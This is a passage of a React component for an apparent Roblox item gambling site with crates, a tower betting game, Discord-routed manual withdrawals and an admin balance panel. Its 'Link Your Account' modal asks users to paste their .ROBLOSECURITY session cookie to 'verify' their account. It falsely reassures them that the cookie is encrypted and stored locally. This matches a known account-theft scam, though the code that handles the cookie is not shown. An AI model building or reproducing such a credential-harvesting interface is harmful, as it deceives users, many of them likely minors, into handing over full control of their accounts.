                      <div key={idx} className="px-3 py-1 bg-slate-800 rounded text-sm text-slate-300">
                        Level {idx + 1}: {mult}x
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            ) : (
              <div className="bg-slate-900 rounded-2xl p-8 border border-slate-800">
                <div className="flex items-center justify-between mb-6">
                  <div>
                    <p className="text-sm text-slate-400">Current Level</p>
                    <p className="text-3xl font-bold text-indigo-400">{towerGame.currentLevel + 1}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-sm text-slate-400">Multiplier</p>
                    <p className="text-3xl font-bold text-emerald-400">{towerGame.multiplier}x</p>
                  </div>
                </div>

                <div className="grid gap-4 mb-6" style={{ gridTemplateColumns: `repeat(${towerGrid.length}, 1fr)` }}>
                  {towerGrid.map((isSafe, idx) => (
                    <motion.button
                      key={idx}
                      onClick={() => clickTowerTile(idx)}
                      disabled={!towerGame.active || towerRevealed[idx]}
                      whileHover={towerGame.active && !towerRevealed[idx] ? { scale: 1.05 } : {}}
                      whileTap={towerGame.active && !towerRevealed[idx] ? { scale: 0.95 } : {}}
                      className={cn(
                        "aspect-square rounded-xl border-2 transition-all flex items-center justify-center text-3xl",
                        !towerRevealed[idx] && towerGame.active && "bg-slate-800 border-slate-600 hover:border-indigo-500 cursor-pointer",
                        !towerRevealed[idx] && !towerGame.active && "bg-slate-800 border-slate-700 opacity-50",
                        towerRevealed[idx] && isSafe && "bg-emerald-900/50 border-emerald-500",
                        towerRevealed[idx] && !isSafe && "bg-red-900/50 border-red-500"
                      )}
                    >
                      {towerRevealed[idx] && (isSafe ? '✅' : '💣')}
                      {!towerRevealed[idx] && '?'}
                    </motion.button>
                  ))}
                </div>

                {towerGame.active && (
                  <Button
                    onClick={cashoutTower}
                    className="w-full h-14 text-lg bg-emerald-600 hover:bg-emerald-700"
                  >
                    Cashout (${Math.floor(towerGame.bet * towerGame.multiplier)})
                  </Button>
                )}

                {showTowerResult === 'loss' && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="text-center text-red-400 text-xl font-bold"
                  >
                    💥 Busted!
                  </motion.div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Items Tab */}
        {activeTab === 'items' && (
          <div>
            <h2 className="text-2xl font-bold mb-6">All Items</h2>
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
              {ALL_ITEMS.sort((a, b) => b.value - a.value).map((item) => (
                <div
                  key={item.id}
                  className={cn(
                    "p-4 rounded-xl border transition-all hover:scale-105",
                    item.rarity === 'legendary' && "bg-gradient-to-br from-yellow-900/30 to-slate-900 border-yellow-500/30",
                    item.rarity === 'epic' && "bg-gradient-to-br from-purple-900/30 to-slate-900 border-purple-500/30",
                    item.rarity === 'rare' && "bg-gradient-to-br from-blue-900/30 to-slate-900 border-blue-500/30",
                    item.rarity === 'uncommon' && "bg-slate-900 border-slate-700",
                    item.rarity === 'common' && "bg-slate-900 border-slate-800"
                  )}
                >
                  <div className="text-4xl mb-3">{item.icon}</div>
                  <p className="font-medium text-slate-200 mb-1">{item.name}</p>
                  <p className="text-xl text-emerald-400 font-mono">${item.value.toLocaleString()}</p>
                  <div className="flex items-center justify-between mt-2">
                    <span className={cn(
                      "text-xs px-2 py-1 rounded capitalize",
                      item.demand === 'High' && "bg-emerald-900/50 text-emerald-400",
                      item.demand === 'Mid' && "bg-yellow-900/50 text-yellow-400",
                      item.demand === 'Low' && "bg-red-900/50 text-red-400",
                      item.demand === 'Horrendous' && "bg-slate-800 text-slate-500"
                    )}>
                      {item.demand} Demand
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Inventory Tab */}
        {activeTab === 'inventory' && (
          <div>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-2xl font-bold">My Inventory</h2>
              <p className="text-slate-400">{user?.inventory.length || 0} items</p>
            </div>
            
            {user?.inventory.length === 0 ? (
              <div className="text-center py-16 bg-slate-900 rounded-2xl border border-slate-800">
                <div className="w-16 h-16 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-4">
                  <Box className="w-8 h-8 text-slate-600" />
                </div>
                <p className="text-slate-500">Your inventory is empty</p>
                <Button onClick={() => setActiveTab('crates')} className="mt-4">
                  Open Some Crates
                </Button>
              </div>
            ) : (
              <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                {user?.inventory.map((item, idx) => (
                  <div
                    key={`${item.id}-${idx}`}
                    className={cn(
                      "p-4 rounded-xl border transition-all hover:scale-105",
                      item.rarity === 'legendary' && "bg-gradient-to-br from-yellow-900/30 to-slate-900 border-yellow-500/30",
                      item.rarity === 'epic' && "bg-gradient-to-br from-purple-900/30 to-slate-900 border-purple-500/30",
                      item.rarity === 'rare' && "bg-gradient-to-br from-blue-900/30 to-slate-900 border-blue-500/30",
                      item.rarity === 'uncommon' && "bg-slate-900 border-slate-700",
                      item.rarity === 'common' && "bg-slate-900 border-slate-800"
                    )}
                  >
                    <div className="text-4xl mb-3">{item.icon}</div>
                    <p className="font-medium text-slate-200 text-sm">{item.name}</p>
                    <p className="text-emerald-400 font-mono">${item.value}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Withdraw Tab */}
        {activeTab === 'withdraw' && (
          <div className="max-w-2xl mx-auto">
            <h2 className="text-2xl font-bold mb-6">Withdraw Items</h2>
            
            {user?.inventory.length === 0 ? (
              <div className="text-center py-16 bg-slate-900 rounded-2xl border border-slate-800">
                <div className="w-16 h-16 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-4">
                  <ArrowUp className="w-8 h-8 text-slate-600" />
                </div>
                <p className="text-slate-500">No items to withdraw</p>
                <Button onClick={() => setActiveTab('crates')} className="mt-4">
                  Get Items First
                </Button>
              </div>
            ) : (
              <div className="bg-slate-900 rounded-2xl p-6 border border-slate-800">
                <div className="mb-6">
                  <label className="text-sm text-slate-400 mb-2 block">Your Roblox Username</label>
                  <input
                    type="text"
                    value={withdrawRobloxName}
                    onChange={(e) => setWithdrawRobloxName(e.target.value)}
                    placeholder="Enter your Roblox username..."
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-3 focus:border-indigo-500 focus:outline-none"
                  />
                </div>

                <p className="text-sm text-slate-400 mb-4">Select items to withdraw:</p>
                
                <div className="grid grid-cols-3 md:grid-cols-4 gap-3 mb-6">
                  {user?.inventory.map((item, idx) => {
                    const isSelected = selectedWithdrawItems.includes(`${item.id}-${idx}`);
                    return (
                      <button
                        key={`${item.id}-${idx}`}
                        onClick={() => {
                          const id = `${item.id}-${idx}`;
                          if (isSelected) {
                            setSelectedWithdrawItems(selectedWithdrawItems.filter(i => i !== id));
                          } else {
                            setSelectedWithdrawItems([...selectedWithdrawItems, id]);
                          }
                        }}
                        className={cn(
                          "p-3 rounded-xl border-2 transition-all text-left",
                          isSelected
                            ? "border-indigo-500 bg-indigo-500/20"
                            : "border-slate-700 bg-slate-800 hover:border-slate-600"
                        )}
                      >
                        <div className="text-2xl mb-1">{item.icon}</div>
                        <p className="text-xs text-slate-300 truncate">{item.name}</p>
                        <p className="text-xs text-emerald-400">${item.value}</p>
                      </button>
                    );
                  })}
                </div>

                <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-6">
                  <div className="flex items-start gap-3">
                    <AlertCircle className="w-5 h-5 text-yellow-500 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-yellow-200 font-medium">Manual Processing</p>
                      <p className="text-yellow-200/70 text-sm">
                        Withdrawals are done manually and may take up to 24 hours. 
                        Join our Discord for faster processing.
                      </p>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={() => {
                    if (selectedWithdrawItems.length > 0 && withdrawRobloxName) {
                      submitWithdrawal(selectedWithdrawItems, withdrawRobloxName);
                      setSelectedWithdrawItems([]);
                      setWithdrawRobloxName('');
                      alert('Withdrawal request submitted!');
                    }
                  }}
                  disabled={selectedWithdrawItems.length === 0 || !withdrawRobloxName}
                  className="w-full h-14"
                >
                  Request Withdrawal ({selectedWithdrawItems.length} items)
                </Button>
              </div>
            )}

            <a
              href="https://discord.gg/AHZzD9WJEb"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-6 flex items-center justify-center gap-2 p-4 bg-indigo-600/20 border border-indigo-500/30 rounded-xl text-indigo-400 hover:bg-indigo-600/30 transition-all"
            >
              <Globe className="w-5 h-5" />
              Join Discord for Instant Support
            </a>
          </div>
        )}

        {/* Admin Tab */}
        {activeTab === 'admin' && isAdmin && (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold flex items-center gap-2">
                <Shield className="w-6 h-6 text-indigo-400" />
                Admin Panel
              </h2>
              <div className="flex gap-2">
                <Button onClick={() => { setShowUserManager(true); setShowPromoManager(false); }} variant="outline">
                  <Users className="w-4 h-4 mr-2" />
                  Users
                </Button>
                <Button onClick={() => { setShowUserManager(false); setShowPromoManager(true); }} variant="outline">
                  <Gift className="w-4 h-4 mr-2" />
                  Promo Codes
                </Button>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
                <p className="text-slate-400 text-sm">Total Users</p>
                <p className="text-3xl font-bold text-indigo-400">{allUsers.length}</p>
              </div>
              <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
                <p className="text-slate-400 text-sm">Total Withdrawals</p>
                <p className="text-3xl font-bold text-emerald-400">{withdrawRequests.filter(r => r.status === 'approved').length}</p>
              </div>
              <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
                <p className="text-slate-400 text-sm">Pending Withdrawals</p>
                <p className="text-3xl font-bold text-yellow-400">
                  {withdrawRequests.filter(r => r.status === 'pending').length}
                </p>
              </div>
            </div>

            <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
              <h3 className="font-semibold mb-4">Pending Withdrawals</h3>
              {withdrawRequests.filter(r => r.status === 'pending').length === 0 ? (
                <p className="text-slate-500">No pending withdrawals</p>
              ) : (
                <div className="space-y-3">
                  {withdrawRequests.filter(r => r.status === 'pending').map((req) => (
                    <div key={req.id} className="flex items-center justify-between p-4 bg-slate-800 rounded-lg">
                      <div>
                        <p className="font-medium">{req.userName}</p>
                        <p className="text-sm text-slate-400">{req.robloxUsername}</p>
                        <p className="text-sm text-slate-500">{req.itemIds.length} items</p>
                      </div>
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          onClick={() => handleWithdrawAction(req.id, 'approved')}
                          className="bg-emerald-600 hover:bg-emerald-700"
                        >
                          Approve
                        </Button>
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => handleWithdrawAction(req.id, 'rejected')}
                        >
                          Reject
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {showUserManager && (
              <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
                <h3 className="font-semibold mb-4">Manage Users</h3>
                <div className="space-y-4">
                  <div className="flex gap-2">
                    <select
                      value={selectedUserId}
                      onChange={(e) => setSelectedUserId(e.target.value)}
                      className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2"
                    >
                      <option value="">Select user...</option>
                      {allUsers.map(u => (
                        <option key={u.id} value={u.id}>
                          {u.name} - ${u.balance}
                        </option>
                      ))}
                    </select>
                    <input
                      type="number"
                      value={balanceToAdd}
                      onChange={(e) => setBalanceToAdd(parseInt(e.target.value) || 0)}
                      placeholder="Amount"
                      className="w-32 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2"
                    />
                    <Button onClick={addBalanceToUser}>
                      Add
                    </Button>
                  </div>
                  
                  <div className="max-h-64 overflow-y-auto space-y-2">
                    {allUsers.map(u => (
                      <div key={u.id} className="flex items-center justify-between p-3 bg-slate-800 rounded-lg">
                        <div className="flex items-center gap-3">
                          <img src={u.picture} alt={u.name} className="w-8 h-8 rounded-full" />
                          <div>
                            <p className="text-sm font-medium">{u.name}</p>
                            <p className="text-xs text-slate-500">{u.email}</p>
                          </div>
                        </div>
                        <p className="text-emerald-400 font-mono">${u.balance.toLocaleString()}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {showPromoManager && (
              <div className="bg-slate-900 rounded-xl p-6 border border-slate-800">
                <h3 className="font-semibold mb-4">Manage Promo Codes</h3>
                <div className="space-y-4 mb-6">
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={newPromoCode}
                      onChange={(e) => setNewPromoCode(e.target.value)}
                      placeholder="Code (e.g. WELCOME)"
                      className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2"
                    />
                    <input
                      type="number"
                      value={newPromoAmount}
                      onChange={(e) => setNewPromoAmount(parseInt(e.target.value) || 0)}
                      placeholder="Amount"
                      className="w-24 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2"
                    />
                    <input
                      type="number"
                      value={newPromoUses}
                      onChange={(e) => setNewPromoUses(parseInt(e.target.value) || 0)}
                      placeholder="Uses"
                      className="w-24 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2"
                    />
                    <Button onClick={createPromoCode}>
                      Create
                    </Button>
                  </div>
                </div>
                
                <div className="space-y-2">
                  {promoCodes.map((code) => (
                    <div key={code.code} className="flex items-center justify-between p-3 bg-slate-800 rounded-lg">
                      <div>
                        <p className="font-mono font-bold text-indigo-400">{code.code}</p>
                        <p className="text-sm text-slate-400">${code.amount} • {code.usesLeft}/{code.totalUses} uses left</p>
                      </div>
                      <Button
                        size="sm"
                        variant="destructive"
                        onClick={() => setPromoCodes(promoCodes.filter(c => c.code !== code.code))}
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </main>

      {/* Admin Login Modal */}
      <AnimatePresence>
        {showAdminLogin && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-slate-900 rounded-2xl p-6 max-w-sm w-full border border-slate-800"
            >
              <h3 className="text-xl font-bold mb-4">Admin Login</h3>
              <input
                type="password"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="Enter password..."
                className="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-3 mb-4 focus:border-indigo-500 focus:outline-none"
              />
              <div className="flex gap-2">
                <Button onClick={() => setShowAdminLogin(false)} variant="ghost" className="flex-1">
                  Cancel
                </Button>
                <Button onClick={adminLogin} className="flex-1">
                  Login
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* RobloSecurity Modal */}
      <AnimatePresence>
        {showRobloSecurityModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-slate-900 rounded-2xl p-6 max-w-md w-full border border-slate-800"
            >
              <div className="text-center mb-6">
                <div className="w-16 h-16 mx-auto bg-indigo-600 rounded-full flex items-center justify-center mb-4">
                  <Lock className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-xl font-bold">Link Your Account</h3>
                <p className="text-slate-400 text-sm mt-2">
                  Enter your .ROBLOSECURITY cookie to verify your Roblox account and enable withdrawals.
                </p>
              </div>
              
              <textarea
                value={robloSecurity}
                onChange={(e) => setRobloSecurity(e.target.value)}
                placeholder="Paste your .ROBLOSECURITY cookie here..."
                className="w-full h-32 bg-slate-950 border border-slate-700 rounded-lg px-4 py-3 mb-4 text-xs font-mono focus:border-indigo-500 focus:outline-none resize-none"
              />
              
              <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-3 mb-4">
                <p className="text-xs text-yellow-200/70">
                  Your cookie is encrypted and stored locally. Never share it with anyone.
                </p>
              </div>
              
              <div className="flex gap-2">
                <Button onClick={() => setShowRobloSecurityModal(false)} variant="ghost" className="flex-1">
                  Skip for now
                </Button>
                <Button 
                  onClick={submitRobloSecurity} 
                  disabled={robloSecurity.length < 50}
                  className="flex-1"
                >
                  Verify
                </Button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Win Modal */}
      <AnimatePresence>
        {showWinModal && wonItem && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.5, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.5, opacity: 0 }}
              className={cn(
                "bg-slate-900 rounded-3xl p-8 max-w-md w-full border-4 text-center",
                wonItem.rarity === 'legendary' && "border-yellow-500",
                wonItem.rarity === 'epic' && "border-purple-500",
                wonItem.rarity === 'rare' && "border-blue-500",
                wonItem.rarity === 'uncommon' && "border-slate-500",
                wonItem.rarity === 'common' && "border-slate-700"
              )}
            >
              <motion.div
                initial={{ y: -20 }}
                animate={{ y: 0 }}
                className="text-6xl mb-4"
              >
                {wonItem.icon}
              </motion.div>
              
              <h2 className={cn(
                "text-3xl font-bold mb-2",
                wonItem.rarity === 'legendary' && "text-yellow-400",
                wonItem.rarity === 'epic' && "text-purple-400",
                wonItem.rarity === 'rare' && "text-blue-400"
              )}>
                {wonItem.rarity === 'legendary' ? 'LEGENDARY!' : wonItem.rarity === 'epic' ? 'EPIC!' : 'You Won!'}
              </h2>
              
              <p className="text-xl text-slate-200 mb-2">{wonItem.name}</p>
              <p className="text-3xl font-bold text-emerald-400 mb-6">${wonItem.value.toLocaleString()}</p>
              
              <Button
                onClick={() => setShowWinModal(false)}
                className="w-full h-14 text-lg"
              >
                Claim Item
              </Button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// Types for window.google
declare global {
  interface Window {
    google: {
      accounts: {
        id: {
          initialize: (config: any) => void;
          prompt: () => void;
        };
      };
    };
  }
}
